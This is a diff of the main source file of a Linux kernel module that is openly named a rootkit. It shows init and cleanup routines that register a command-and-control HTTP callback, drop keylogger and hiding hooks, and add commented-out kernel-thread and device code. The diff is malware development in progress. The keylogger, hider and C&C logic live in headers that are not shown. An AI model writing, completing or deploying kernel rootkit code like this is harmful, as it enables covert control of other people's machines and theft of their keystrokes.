@@ -1,27 +1,60 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/types.h>
-#include "hidder.h"
 #include "engine.h"
-#include "keylogger.h"
 #include "cnc.h"
+#include "intercom.h"
 
+// typedef struct _run_cmd_args{
+// 	char * arg;
+// 	unsigned int arg_len;
+// }run_cmd_args;
+
+
+// #include <linux/kthread.h> 
+// #include <linux/slab.h> 
+// static struct task_struct *thread1;
+
+// typedef struct _run_cmd_args{
+// 	char * arg;
+// 	unsigned int arg_len;	
+// }run_cmd_args;
+
+// static int simple( void *arguments)
+// {
+// 	run_cmd_args * a = (run_cmd_args*)arguments;
+// 	if (a)
+// 		printk("arg_len = %d.", a->arg_len);
+	
+// 	printk("[+] Colman: Simple thread %d\n", arguments);
+// 	do_exit(0);
+
+// }
 
 int init_rootkit ( void )
 {
-	printk("[+] Init_rootkit\n");
-	// set_keylogger();
-	set_http_callback();
+	// run_cmd_args * a = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
+	// a->arg_len = 112;
+	printk("[+] Colman: init_rootkit\n");
+	// thread1 = kthread_run(simple, a, "simple");
 
-	//set_dkom_lkm();
+	set_http_callback();
+	// if (init_intercom()!=0)
+	// {
+	//  	unset_http_callback();
+	// 	printk("[-] Colman to create dev char: Failed");
+	// 	return -1;
+	// }
+
+	return 0;
 }
 
 
 void clean_rootkit ( void )
 {
-	printk("[+] clean_rootkit\n");
-	// unset_keylogger();
+	printk("[+] Colman: clean_rootkit\n");
 	unset_http_callback();
+	//clean_intercom();
 }
 
 
